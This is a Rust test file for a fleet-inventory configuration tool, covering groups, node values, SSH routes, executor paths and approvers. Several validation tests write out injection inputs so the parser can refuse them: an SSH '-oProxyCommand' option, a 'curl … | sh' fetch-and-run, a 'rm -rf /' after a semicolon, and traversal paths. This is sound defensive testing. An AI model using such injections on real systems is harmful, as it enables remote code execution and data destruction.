//! Which machines there are, and what is written down about them.
//!
//! A hundred machines cannot be a hundred declarations, and the reason a group
//! may be iterated where a fact may not is that the fleet is settled before the
//! program runs. See decision 0025.

// Tests are allowed to be blunt. See docs/CODING_STANDARDS.md.
#![allow(clippy::unwrap_used, clippy::indexing_slicing, clippy::panic)]

use nerpa_config::evaluate;
use nerpa_config::fleet::Fleet;
use nerpa_config::template::Held;
use nerpa_core::Attribute;
use nerpa_core::address::address;

const FLEET: &str = r#"
[groups.web]
workers = 4
port = 443

[groups.production]
retention = 30

[nodes.web-01]
groups = ["web", "production"]

[nodes.web-02]
groups = ["web", "production"]
values = { workers = 16 }

[nodes.db-01]
groups = ["production"]
"#;

fn fleet() -> Fleet {
    Fleet::read(FLEET).expect("a fleet")
}

fn graph_of(source: &str) -> nerpa_core::Graph {
    evaluate("main.star", source, Box::new(Held::new()), fleet()).expect("it should evaluate")
}

/// The whole point: one declaration, every machine in the group.
#[test]
#[dacc_derive::doc_anchor(
    id = "a-group-is-iterated-and-a-hundred-machines-are-not-a-hundred-declarations"
)]
fn a_group_is_iterated_and_a_hundred_machines_are_not_a_hundred_declarations() {
    let graph = graph_of(
        r#"
for host in group("web"):
    resource("os:file.conf@%s" % host, {"workers": host["workers"]})
"#,
    );

    assert_eq!(graph.len(), 2, "one resource per machine in the group");
    for (node, workers) in [("web-01", 4), ("web-02", 16)] {
        let found = graph
            .get(&address(&format!("os:file.conf@{node}")))
            .and_then(|resource| resource.attribute("workers"))
            .and_then(Attribute::known)
            .expect("a value");
        assert_eq!(found, &nerpa_core::Value::Integer(workers));
    }
}

/// A node saying what it is is a statement, not a rank in a table of twenty-two
/// levels nobody can remember.
#[test]
#[dacc_derive::doc_anchor(id = "a-node-may-say-what-its-groups-do-not")]
fn a_node_may_say_what_its_groups_do_not() {
    let graph = graph_of(
        r#"
for host in group("production"):
    resource("os:file.conf@%s" % host, {"retention": host["retention"]})
"#,
    );
    assert_eq!(graph.len(), 3, "web-01, web-02 and db-01");
}

/// Ansible answers "where did this value come from" with a precedence table.
/// Here the question has one answer per value, and a collision is something
/// somebody decides rather than something a rule decides for them.
#[test]
#[dacc_derive::doc_anchor(id = "two-groups-giving-one-node-the-same-key-is-an-error-naming-both")]
fn two_groups_giving_one_node_the_same_key_is_an_error_naming_both() {
    let refusal = Fleet::read(
        r#"
[groups.web]
workers = 4

[groups.production]
workers = 8

[nodes.web-01]
groups = ["web", "production"]
"#,
    )
    .expect_err("a precedence rule is not the answer");

    assert!(refusal.contains("web-01"), "{refusal}");
    assert!(refusal.contains("\"web\""), "{refusal}");
    assert!(refusal.contains("\"production\""), "{refusal}");
    assert!(refusal.contains("workers"), "{refusal}");
}

#[test]
#[dacc_derive::doc_anchor(
    id = "a-value-the-fleet-does-not-give-is-a-refusal-rather-than-a-default"
)]
fn a_value_the_fleet_does_not_give_is_a_refusal_rather_than_a_default() {
    let refusal = evaluate(
        "main.star",
        r#"
for host in group("web"):
    resource("os:file.conf@%s" % host, {"nothing": host["nowhere"]})
"#,
        Box::new(Held::new()),
        fleet(),
    )
    .expect_err("an absent value is not an empty one");
    assert!(refusal.to_string().contains("nowhere"), "{refusal}");
}

#[test]
fn a_group_nothing_describes_is_a_refusal_rather_than_an_empty_run() {
    let refusal = evaluate(
        "main.star",
        r#"
for host in group("nonesuch"):
    resource("os:file.conf@%s" % host, {})
"#,
        Box::new(Held::new()),
        fleet(),
    )
    .expect_err("a group that is not there is a mistake, not nothing to do");
    assert!(refusal.to_string().contains("nonesuch"), "{refusal}");
}

/// Only what a run touches, because a document describing two hundred machines
/// should not make a run that touches three open two hundred connections.
#[test]
#[dacc_derive::doc_anchor(id = "only-the-machines-a-run-reaches-for-join-its-inventory")]
fn only_the_machines_a_run_reaches_for_join_its_inventory() {
    let graph = graph_of(
        r#"
for host in group("web"):
    resource("os:file.conf@%s" % host, {})
"#,
    );
    let known: Vec<&str> = graph
        .inventory()
        .nodes()
        .map(nerpa_core::Target::as_str)
        .collect();
    assert_eq!(known, vec!["web-01", "web-02"], "db-01 was never asked for");
}

/// A fleet is data by the time the program sees it, so it may be compared and
/// branched on — which is exactly what a fact may not do.
#[test]
#[dacc_derive::doc_anchor(id = "what-the-fleet-says-may-decide-which-resources-exist")]
fn what_the_fleet_says_may_decide_which_resources_exist() {
    let graph = graph_of(
        r#"
for host in group("web"):
    if host["workers"] > 8:
        resource("os:file.big@%s" % host, {})
"#,
    );
    assert_eq!(graph.len(), 1, "only web-02 has sixteen");
    assert!(graph.get(&address("os:file.big@web-02")).is_some());
}

/// How a machine is reached is a property of the node, not of the protocol.
/// Escalation is an argument and appears nowhere on the wire — decision 0035.
#[test]
fn a_node_says_how_it_is_reached_and_what_it_runs_under() {
    use nerpa_config::fleet::Route;

    let fleet = Fleet::read(
        r#"
[groups.test]
kept = 1

[nodes.here]
groups = ["test"]

[nodes.plain]
groups = ["test"]
ssh = "192.0.2.34"

[nodes.privileged]
groups = ["test"]
ssh = "web-01"
executor = "/opt/nerpa/nerpa-executor"
become = "sudo -n"

[nodes.proxied]
groups = ["test"]
ssh = "nerpa@web-02.example.internal"
ssh_config = "/home/somebody/.tbot/nerpa/ssh_config"
"#,
    )
    .expect("a fleet");

    let node = |name: &str| nerpa_core::Target::new(name).expect("a node name");

    assert_eq!(
        fleet.route(&node("here")),
        Route::Here,
        "a machine the document says nothing about is this one"
    );
    assert_eq!(
        fleet.route(&node("plain")),
        Route::Ssh {
            host: "192.0.2.34".to_owned(),
            config: None,
            executor: None,
            escalate: Vec::new(),
        },
        "and one that names no executor gets one put there"
    );
    assert_eq!(
        fleet.route(&node("privileged")),
        Route::Ssh {
            host: "web-01".to_owned(),
            config: None,
            executor: Some("/opt/nerpa/nerpa-executor".to_owned()),
            escalate: vec!["sudo".to_owned(), "-n".to_owned()],
        },
        "escalation is words, because a shell string is where somebody else's \
         quoting becomes somebody else's command"
    );
    assert_eq!(
        fleet.route(&node("proxied")),
        Route::Ssh {
            host: "nerpa@web-02.example.internal".to_owned(),
            config: Some("/home/somebody/.tbot/nerpa/ssh_config".to_owned()),
            executor: None,
            escalate: Vec::new(),
        },
        "a machine behind an identity-aware proxy names the generated \
         configuration and needs nothing else: it is a route, not a transport"
    );
}

/// `ssh` hands its host to the local `ssh` binary as a positional argument, and
/// `ssh` reads a leading `-` as another option — `-oProxyCommand=…` runs a
/// command **here**, before any machine is contacted. A fleet is a document
/// that gets swapped, shared and one day generated from a cloud inventory, so a
/// name out of one must not be able to reach the control machine.
#[test]
fn a_host_that_would_be_read_as_an_option_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "-oProxyCommand=touch /tmp/pwned"
"#,
    )
    .expect_err("a host cannot begin with a dash");
    assert!(
        refusal.contains("web-01") && refusal.contains("option"),
        "the refusal should name the node and what would happen: {refusal}"
    );
}

/// `ssh` joins whatever trails the host into one string and hands it to a shell
/// on the far side. An executor "path" holding a `;` is two commands there.
#[test]
fn an_executor_that_is_not_a_path_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
executor = "/bin/true; curl http://elsewhere/x | sh"
"#,
    )
    .expect_err("that is not a path");
    assert!(
        refusal.contains("executor"),
        "the refusal should name the field: {refusal}"
    );
}

/// A remote shell resolves anything but an absolute path from where the
/// connection starts, which is the connecting user's home, and `~` is that home
/// by name. With `become`, a binary that user can write is root for them, which is
/// what 0039 refuses; the characters alone let all three of these through.
#[test]
fn an_executor_that_is_not_an_absolute_path_is_refused() {
    for path in [
        "~/nerpa-executor",
        "bin/nerpa-executor",
        "/usr/local/sbin/../../home/nerpa/nerpa-executor",
    ] {
        let refusal = Fleet::read(&format!(
            r#"
[nodes.web-01]
ssh = "nerpa@web-01"
executor = "{path}"
become = "sudo -n"
"#
        ))
        .expect_err(path);
        assert!(
            refusal.contains("executor") && refusal.contains("absolute"),
            "the refusal should name the field and why: {refusal}"
        );
    }
}

#[test]
fn an_escalation_that_is_not_a_command_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
become = "sudo -n; rm -rf /"
"#,
    )
    .expect_err("that is not an escalation");
    assert!(
        refusal.contains("become"),
        "the refusal should name the field: {refusal}"
    );
}

/// And the ordinary shapes still read: a host, an alias, an address, a user at
/// a host, a path, and an escalation of several words.
#[test]
fn the_shapes_people_actually_write_still_read() {
    let fleet = Fleet::read(
        r#"
[nodes.by-alias]
ssh = "web-01"

[nodes.by-name]
ssh = "web-01.example.internal"

[nodes.by-address]
ssh = "192.0.2.34"

[nodes.as-somebody]
ssh = "nerpa@web-01.example.internal"
executor = "/opt/nerpa/nerpa-executor"
become = "sudo -n"
"#,
    )
    .expect("nothing here is a way to run a command");
    assert_eq!(fleet.len(), 4);
}

/// An executor the connecting user can write is an executor that user can run
/// as root, so `NOPASSWD` on a delivered one is full root wearing a narrow
/// rule. The two are refused together, and the refusal names the way out: an
/// executor root put somewhere that user cannot write.
#[test]
fn escalating_to_an_executor_nerpa_delivers_is_refused() {
    let refusal = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
become = "sudo -n"
"#,
    )
    .expect_err("that combination is root in disguise");
    assert!(
        refusal.contains("executor") && refusal.contains("become"),
        "the refusal should name both halves and the way out: {refusal}"
    );
}

/// Either alone is fine. Delivering to run unprivileged is the ordinary case,
/// and naming an installed executor without escalating is somebody who put it
/// somewhere of their own.
#[test]
fn delivering_without_escalating_and_escalating_to_an_installed_one_both_read() {
    let fleet = Fleet::read(
        r#"
[nodes.delivered]
ssh = "web-01"

[nodes.installed]
ssh = "web-02"
executor = "/usr/local/sbin/nerpa-executor"
become = "sudo -n"

[nodes.named-only]
ssh = "web-03"
executor = "/opt/nerpa/nerpa-executor"
"#,
    )
    .expect("none of these is the trap");
    assert_eq!(fleet.len(), 3);
}

/// `INV-TRUST-001` names its bypass: a static key reaching the transport
/// through the fleet document. A node's fields are a closed set, the key
/// belongs to `ssh`, and a document that names one is refused by name rather
/// than quietly ignored.
#[test]
#[dacc_derive::doc_anchor(id = "a-fleet-that-names-a-key-is-refused-naming-it")]
fn a_fleet_that_names_a_key_is_refused_naming_it() {
    let refused = Fleet::read(
        r#"
[nodes.web-01]
ssh = "web-01"
key = "/home/somebody/.ssh/id_ed25519"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("\"key\""), "{refused}");
    assert!(refused.contains("belong to `ssh`"), "{refused}");
}

/// Where a deployment keeps the two duties apart, the fleet names the
/// approvers (`0009`). One that names none asks for no signature.
#[test]
fn a_fleet_says_who_may_sign_a_plan() {
    let named = Fleet::read(
        r#"
[approval]
approvers = "/etc/nerpa/approvers"

[nodes.web-01]
"#,
    )
    .expect("a fleet");
    assert_eq!(named.approvers(), Some("/etc/nerpa/approvers"));

    assert_eq!(
        fleet().approvers(),
        None,
        "and one that names none says none"
    );
}

/// The approval table is a closed set, like a node's fields: a field silently
/// ignored would leave a document that says something no run does.
#[test]
fn an_approval_field_nobody_knows_is_refused_naming_it() {
    let refused = Fleet::read(
        r#"
[approval]
signers = "/etc/nerpa/approvers"
"#,
    )
    .unwrap_err();
    assert!(refused.contains("\"signers\""), "{refused}");
}

/// An approval table that says nobody may sign says nothing at all: naming the
/// table without the approvers is refused rather than read as no policy.
#[test]
fn an_approval_table_that_nobody_may_sign_under_is_refused() {
    let refused = Fleet::read("[approval]\n").unwrap_err();
    assert!(refused.contains("approvers"), "{refused}");
}
